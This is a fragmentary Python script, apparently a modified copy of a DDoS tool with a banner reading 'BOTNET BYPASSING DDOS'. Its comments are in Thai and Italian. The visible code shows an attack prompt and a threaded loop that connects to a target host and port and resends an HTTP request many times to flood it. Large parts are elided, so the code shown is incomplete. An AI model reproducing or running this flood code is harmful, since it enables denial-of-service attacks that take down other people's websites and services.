...
try: # ตั้งค่าสำหรับ Linux
	...
	print ("HACKER NEW 2020 , ANACHAKHACKER BY PURE c0dEr0o9 (modify)") # ตัวนี้ยิงได้แค่ HTTP นะยังไม่แก้เรื่อง UDP TCP เลยนะ

print('''
=====================================================
  BOTNET BYPASSING DDOS BY PURE c0dEr0o9 (modify)
=====================================================
|Version : V.5.0.8.1           |
|Create  : 11/5/63          |
############################## Bypassing 
...
def begin():
	choice6 = input("Enter To Start Attack By ATTECK: ")
	if choice6 == "":
		loop()
	...
	def run(self): # la funzione che da' le istruzioni ai vari threads
		...
		while True:
			try:
				...
				s.connect((str(url2), int(urlport))) # connessione
				s.send (str.encode(request)) # invio
				print ("Start the script's command. ATTACK! @", self.counter) # print req + counter
				try: # invia altre richieste nello stesso thread
					for y in range(multiple): # fattore di moltiplicazione
						s.send(str.encode(request)) # encode in bytes della richiesta HTTP
				except: # se qualcosa va storto, chiude il socket e il ciclo ricomincia
